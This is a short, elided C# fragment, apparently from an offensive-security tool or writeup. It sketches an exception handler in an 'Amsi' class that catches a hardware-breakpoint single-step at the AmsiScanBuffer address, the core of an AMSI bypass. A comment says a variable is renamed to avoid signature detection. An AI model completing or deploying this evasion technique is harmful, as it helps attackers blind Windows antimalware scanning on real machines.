...
namespace HWBP
{
    public class Amsi
    {
        ...
        public static long Handler(IntPtr exceptions)
        {
			...
			# adding a pointer variable to avoid signature detection
			IntPtr NotThePTRyourLookingFor = ExceptionRecord.ExceptionAddress;

            if (ExceptionRecord.ExceptionCode == WinAPI.EXCEPTION_SINGLE_STEP && NotThePTRyourLookingFor == pABuF)
            {
